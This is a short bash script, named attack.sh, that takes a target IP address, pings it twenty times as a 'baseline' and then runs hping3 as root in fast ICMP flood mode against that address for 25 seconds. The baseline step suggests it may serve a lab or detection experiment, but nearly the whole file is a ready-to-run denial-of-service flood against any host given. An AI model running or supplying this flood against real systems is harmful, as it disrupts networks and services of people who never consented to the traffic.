#!/bin/bash
# usage: ./attack.sh <target_ip>
echo "Seeding baseline..."
ping -c 20 "$1"
echo "Attacking for 25 seconds..."
timeout 25 sudo hping3 --icmp --faster "$1"
echo "Attack finished."
